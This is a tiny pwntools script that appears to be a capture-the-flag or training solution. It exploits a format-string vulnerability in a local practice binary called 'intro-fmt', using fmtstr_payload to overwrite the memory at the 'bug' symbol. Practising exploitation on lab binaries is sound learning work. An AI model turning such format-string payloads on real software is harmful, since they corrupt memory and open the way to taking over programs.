from pwn import *
exe = context.binary = ELF("./intro-fmt")
r = process()
offset = 6
fmtpay = fmtstr_payload(offset,{exe.sym['bug'] : "aaa"}, write_size='short')
r.sendline(fmtpay)
r.interactive()